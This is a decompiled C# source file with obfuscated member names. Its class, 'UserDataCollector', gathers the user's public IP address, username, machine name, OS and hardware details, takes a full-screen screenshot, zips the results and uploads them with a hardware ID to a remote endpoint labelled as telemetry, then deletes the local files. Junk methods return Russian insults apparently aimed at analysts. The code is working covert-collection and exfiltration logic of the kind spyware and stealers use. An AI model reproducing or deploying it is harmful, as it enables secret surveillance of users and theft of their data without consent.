using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace UserDataCollector;

public sealed class UserDataCollector
{
	private static readonly string string_0 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

	private static readonly HttpClient httpClient_0 = new HttpClient();

	private byte byte_1;

	private double double_1;

	private bool bool_1;

	private byte Byte_0
	{
		get
		{
			return byte_1;
		}
		set
		{
			byte_1 = value;
		}
	}

	private double Double_0
	{
		get
		{
			return double_1;
		}
		set
		{
			double_1 = value;
		}
	}

	private bool Boolean_0
	{
		get
		{
			return bool_1;
		}
		set
		{
			bool_1 = value;
		}
	}

	public static async Task<bool> CollectAndSendAsync(string hwid, string apiUrl)
	{
		try
		{
			string tempDir = Path.Combine(Path.GetTempPath(), $"kaban_collect_{Guid.NewGuid()}");
			Directory.CreateDirectory(tempDir);
			try
			{
				string text = await GetPublicIpAddress();
				if (!string.IsNullOrEmpty(text))
				{
					File.WriteAllText(Path.Combine(tempDir, "ip_address.txt"), text);
				}
				string text2 = CollectSystemInfo();
				if (!string.IsNullOrEmpty(text2))
				{
					File.WriteAllText(Path.Combine(tempDir, "system_info.txt"), text2);
				}
				CaptureScreenshot(tempDir);
				string zipPath = Path.Combine(Path.GetTempPath(), $"collected_{hwid}_{DateTime.Now:yyyyMMdd_HHmmss}.zip");
				ZipFile.CreateFromDirectory(tempDir, zipPath);
				new FileInfo(zipPath);
				bool result = await UploadCollectedData(hwid, zipPath, apiUrl);
				File.Delete(zipPath);
				return result;
			}
			finally
			{
				try
				{
					Directory.Delete(tempDir, recursive: true);
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
			return false;
		}
	}

	private static async Task<string> GetPublicIpAddress()
	{
		try
		{
			return (await httpClient_0.GetStringAsync("https://api.ipify.org")).Trim();
		}
		catch
		{
			try
			{
				return (await httpClient_0.GetStringAsync("https://icanhazip.com")).Trim();
			}
			catch
			{
				return null;
			}
		}
	}

	private static string CaptureScreenshot(string outputDir)
	{
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Expected O, but got Unknown
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d8: Expected O, but got Unknown
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_0179: Expected O, but got Unknown
		//IL_0151: Expected I8, but got I4
		//IL_014c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0152: Expected O, but got Unknown
		try
		{
			string text = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
			string text2 = Path.Combine(outputDir, "screenshot_" + text + ".jpg");
			Rectangle bounds = Screen.PrimaryScreen.Bounds;
			int num = bounds.Width;
			int num2 = bounds.Height;
			if (num > 1920 || num2 > 1080)
			{
				double num3 = Math.Min(1920.0 / (double)num, 1080.0 / (double)num2);
				num = (int)((double)num * num3);
				num2 = (int)((double)num2 * num3);
			}
			Bitmap val = new Bitmap(bounds.Width, bounds.Height);
			try
			{
				Graphics val2 = Graphics.FromImage((Image)(object)val);
				try
				{
					val2.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
				Bitmap val3 = new Bitmap(num, num2);
				try
				{
					Graphics val4 = Graphics.FromImage((Image)(object)val3);
					try
					{
						val4.InterpolationMode = (InterpolationMode)7;
						val4.DrawImage((Image)(object)val, 0, 0, num, num2);
					}
					finally
					{
						((IDisposable)val4)?.Dispose();
					}
					ImageCodecInfo val5 = ImageCodecInfo.GetImageEncoders().First((ImageCodecInfo c) => c.FormatID == ImageFormat.Jpeg.Guid);
					EncoderParameters val6 = new EncoderParameters(1);
					val6.Param[0] = new EncoderParameter(Encoder.Quality, 60L);
					((Image)val3).Save(text2, val5, val6);
				}
				finally
				{
					((IDisposable)val3)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			new FileInfo(text2);
			return text2;
		}
		catch (Exception)
		{
			return null;
		}
	}

	private static string CollectSystemInfo()
	{
		//IL_036f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0376: Expected O, but got Unknown
		//IL_0202: Unknown result type (might be due to invalid IL or missing references)
		//IL_0209: Expected O, but got Unknown
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("=== SYSTEM INFORMATION ===");
			StringBuilder stringBuilder2 = stringBuilder;
			StringBuilder stringBuilder3 = stringBuilder2;
			StringBuilder.AppendInterpolatedStringHandler handler = new StringBuilder.AppendInterpolatedStringHandler(14, 1, stringBuilder2);
			handler.AppendLiteral("Collected at: ");
			handler.AppendFormatted(DateTime.Now, "yyyy-MM-dd HH:mm:ss");
			stringBuilder3.AppendLine(ref handler);
			stringBuilder.AppendLine();
			stringBuilder2 = stringBuilder;
			StringBuilder stringBuilder4 = stringBuilder2;
			handler = new StringBuilder.AppendInterpolatedStringHandler(10, 1, stringBuilder2);
			handler.AppendLiteral("Username: ");
			handler.AppendFormatted(Environment.UserName);
			stringBuilder4.AppendLine(ref handler);
			stringBuilder2 = stringBuilder;
			StringBuilder stringBuilder5 = stringBuilder2;
			handler = new StringBuilder.AppendInterpolatedStringHandler(15, 1, stringBuilder2);
			handler.AppendLiteral("Computer Name: ");
			handler.AppendFormatted(Environment.MachineName);
			stringBuilder5.AppendLine(ref handler);
			stringBuilder2 = stringBuilder;
			StringBuilder stringBuilder6 = stringBuilder2;
			handler = new StringBuilder.AppendInterpolatedStringHandler(4, 1, stringBuilder2);
			handler.AppendLiteral("OS: ");
			handler.AppendFormatted(Environment.OSVersion);
			stringBuilder6.AppendLine(ref handler);
			stringBuilder2 = stringBuilder;
			StringBuilder stringBuilder7 = stringBuilder2;
			handler = new StringBuilder.AppendInterpolatedStringHandler(12, 1, stringBuilder2);
			handler.AppendLiteral("OS Version: ");
			handler.AppendFormatted(Environment.OSVersion.Version);
			stringBuilder7.AppendLine(ref handler);
			stringBuilder2 = stringBuilder;
			StringBuilder stringBuilder8 = stringBuilder2;
			handler = new StringBuilder.AppendInterpolatedStringHandler(11, 1, stringBuilder2);
			handler.AppendLiteral("64-bit OS: ");
			handler.AppendFormatted(Environment.Is64BitOperatingSystem);
			stringBuilder8.AppendLine(ref handler);
			stringBuilder2 = stringBuilder;
			StringBuilder stringBuilder9 = stringBuilder2;
			handler = new StringBuilder.AppendInterpolatedStringHandler(16, 1, stringBuilder2);
			handler.AppendLiteral("64-bit Process: ");
			handler.AppendFormatted(Environment.Is64BitProcess);
			stringBuilder9.AppendLine(ref handler);
			stringBuilder2 = stringBuilder;
			StringBuilder stringBuilder10 = stringBuilder2;
			handler = new StringBuilder.AppendInterpolatedStringHandler(17, 1, stringBuilder2);
			handler.AppendLiteral("Processor Count: ");
			handler.AppendFormatted(Environment.ProcessorCount);
			stringBuilder10.AppendLine(ref handler);
			long value = GC.GetGCMemoryInfo().TotalAvailableMemoryBytes / 1048576;
			stringBuilder2 = stringBuilder;
			StringBuilder stringBuilder11 = stringBuilder2;
			handler = new StringBuilder.AppendInterpolatedStringHandler(15, 1, stringBuilder2);
			handler.AppendLiteral("Total RAM: ~");
			handler.AppendFormatted(value);
			handler.AppendLiteral(" MB");
			stringBuilder11.AppendLine(ref handler);
			stringBuilder2 = stringBuilder;
			StringBuilder stringBuilder12 = stringBuilder2;
			handler = new StringBuilder.AppendInterpolatedStringHandler(18, 1, stringBuilder2);
			handler.AppendLiteral("System Directory: ");
			handler.AppendFormatted(Environment.SystemDirectory);
			stringBuilder12.AppendLine(ref handler);
			try
			{
				ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_Processor");
				try
				{
					ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current = enumerator.Current;
							stringBuilder2 = stringBuilder;
							StringBuilder stringBuilder13 = stringBuilder2;
							handler = new StringBuilder.AppendInterpolatedStringHandler(10, 1, stringBuilder2);
							handler.AppendLiteral("CPU Name: ");
							handler.AppendFormatted<object>(current["Name"]);
							stringBuilder13.AppendLine(ref handler);
							stringBuilder2 = stringBuilder;
							StringBuilder stringBuilder14 = stringBuilder2;
							handler = new StringBuilder.AppendInterpolatedStringHandler(18, 1, stringBuilder2);
							handler.AppendLiteral("CPU Manufacturer: ");
							handler.AppendFormatted<object>(current["Manufacturer"]);
							stringBuilder14.AppendLine(ref handler);
							stringBuilder2 = stringBuilder;
							StringBuilder stringBuilder15 = stringBuilder2;
							handler = new StringBuilder.AppendInterpolatedStringHandler(11, 1, stringBuilder2);
							handler.AppendLiteral("CPU Cores: ");
							handler.AppendFormatted<object>(current["NumberOfCores"]);
							stringBuilder15.AppendLine(ref handler);
							stringBuilder2 = stringBuilder;
							StringBuilder stringBuilder16 = stringBuilder2;
							handler = new StringBuilder.AppendInterpolatedStringHandler(24, 1, stringBuilder2);
							handler.AppendLiteral("CPU Logical Processors: ");
							handler.AppendFormatted<object>(current["NumberOfLogicalProcessors"]);
							stringBuilder16.AppendLine(ref handler);
							stringBuilder2 = stringBuilder;
							StringBuilder stringBuilder17 = stringBuilder2;
							handler = new StringBuilder.AppendInterpolatedStringHandler(25, 1, stringBuilder2);
							handler.AppendLiteral("CPU Max Clock Speed: ");
							handler.AppendFormatted<object>(current["MaxClockSpeed"]);
							handler.AppendLiteral(" MHz");
							stringBuilder17.AppendLine(ref handler);
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val)?.Dispose();
				}
			}
			catch (Exception ex)
			{
				stringBuilder2 = stringBuilder;
				StringBuilder stringBuilder18 = stringBuilder2;
				handler = new StringBuilder.AppendInterpolatedStringHandler(23, 1, stringBuilder2);
				handler.AppendLiteral("CPU Info (WMI failed): ");
				handler.AppendFormatted(ex.Message);
				stringBuilder18.AppendLine(ref handler);
			}
			try
			{
				ManagementObjectSearcher val2 = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController");
				try
				{
					ManagementObjectEnumerator enumerator = val2.Get().GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current2 = enumerator.Current;
							stringBuilder2 = stringBuilder;
							StringBuilder stringBuilder19 = stringBuilder2;
							handler = new StringBuilder.AppendInterpolatedStringHandler(10, 1, stringBuilder2);
							handler.AppendLiteral("GPU Name: ");
							handler.AppendFormatted<object>(current2["Name"]);
							stringBuilder19.AppendLine(ref handler);
							stringBuilder2 = stringBuilder;
							StringBuilder stringBuilder20 = stringBuilder2;
							handler = new StringBuilder.AppendInterpolatedStringHandler(20, 1, stringBuilder2);
							handler.AppendLiteral("GPU Driver Version: ");
							handler.AppendFormatted<object>(current2["DriverVersion"]);
							stringBuilder20.AppendLine(ref handler);
							long value2 = Convert.ToInt64(current2["AdapterRAM"]) / 1048576;
							stringBuilder2 = stringBuilder;
							StringBuilder stringBuilder21 = stringBuilder2;
							handler = new StringBuilder.AppendInterpolatedStringHandler(15, 1, stringBuilder2);
							handler.AppendLiteral("GPU Memory: ");
							handler.AppendFormatted(value2);
							handler.AppendLiteral(" MB");
							stringBuilder21.AppendLine(ref handler);
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			catch (Exception ex2)
			{
				stringBuilder2 = stringBuilder;
				StringBuilder stringBuilder22 = stringBuilder2;
				handler = new StringBuilder.AppendInterpolatedStringHandler(23, 1, stringBuilder2);
				handler.AppendLiteral("GPU Info (WMI failed): ");
				handler.AppendFormatted(ex2.Message);
				stringBuilder22.AppendLine(ref handler);
			}
			try
			{
				ManagementObjectSearcher val3 = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
				try
				{
					ManagementObjectEnumerator enumerator = val3.Get().GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current3 = enumerator.Current;
							long value3 = Convert.ToInt64(current3["TotalPhysicalMemory"]) / 1048576;
							stringBuilder2 = stringBuilder;
							StringBuilder stringBuilder23 = stringBuilder2;
							handler = new StringBuilder.AppendInterpolatedStringHandler(26, 1, stringBuilder2);
							handler.AppendLiteral("Total Physical Memory: ");
							handler.AppendFormatted(value3);
							handler.AppendLiteral(" MB");
							stringBuilder23.AppendLine(ref handler);
							stringBuilder2 = stringBuilder;
							StringBuilder stringBuilder24 = stringBuilder2;
							handler = new StringBuilder.AppendInterpolatedStringHandler(14, 1, stringBuilder2);
							handler.AppendLiteral("Manufacturer: ");
							handler.AppendFormatted<object>(current3["Manufacturer"]);
							stringBuilder24.AppendLine(ref handler);
							stringBuilder2 = stringBuilder;
							StringBuilder stringBuilder25 = stringBuilder2;
							handler = new StringBuilder.AppendInterpolatedStringHandler(7, 1, stringBuilder2);
							handler.AppendLiteral("Model: ");
							handler.AppendFormatted<object>(current3["Model"]);
							stringBuilder25.AppendLine(ref handler);
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val3)?.Dispose();
				}
			}
			catch (Exception ex3)
			{
				stringBuilder2 = stringBuilder;
				StringBuilder stringBuilder26 = stringBuilder2;
				handler = new StringBuilder.AppendInterpolatedStringHandler(26, 1, stringBuilder2);
				handler.AppendLiteral("System Info (WMI failed): ");
				handler.AppendFormatted(ex3.Message);
				stringBuilder26.AppendLine(ref handler);
			}
			return stringBuilder.ToString();
		}
		catch (Exception ex4)
		{
			return "Error collecting system info: " + ex4.Message;
		}
	}

	private static async Task<bool> UploadCollectedData(string hwid, string zipPath, string apiUrl)
	{
		try
		{
			new FileInfo(zipPath);
			using MultipartFormDataContent content = new MultipartFormDataContent();
			ByteArrayContent byteArrayContent = new ByteArrayContent(File.ReadAllBytes(zipPath));
			byteArrayContent.Headers.ContentType = new MediaTypeHeaderValue("application/zip");
			content.Add(byteArrayContent, "file", Path.GetFileName(zipPath));
			content.Add(new StringContent(hwid), "hwid");
			HttpResponseMessage response = await httpClient_0.PostAsync(apiUrl + "/api/v1/telemetry/upload-collected", content);
			await response.Content.ReadAsStringAsync();
			if (!response.IsSuccessStatusCode)
			{
				return false;
			}
			return true;
		}
		catch (Exception ex)
		{
			_ = ex.InnerException;
			return false;
		}
	}

	private static void CopyDirectory(string sourceDir, string destDir)
	{
		Directory.CreateDirectory(destDir);
		string[] files = Directory.GetFiles(sourceDir);
		foreach (string text in files)
		{
			string destFileName = Path.Combine(destDir, Path.GetFileName(text));
			File.Copy(text, destFileName, overwrite: true);
		}
		files = Directory.GetDirectories(sourceDir);
		foreach (string text2 in files)
		{
			string destDir2 = Path.Combine(destDir, Path.GetFileName(text2));
			CopyDirectory(text2, destDir2);
		}
	}

	private string method_4(double double_2, long long_1)
	{
		return "Хитролох_иди_нахуй._________04___7__0";
	}

	private string method_6(char char_0, float float_0)
	{
		return "Хитролох_иди_нахуй._____3500";
	}
}
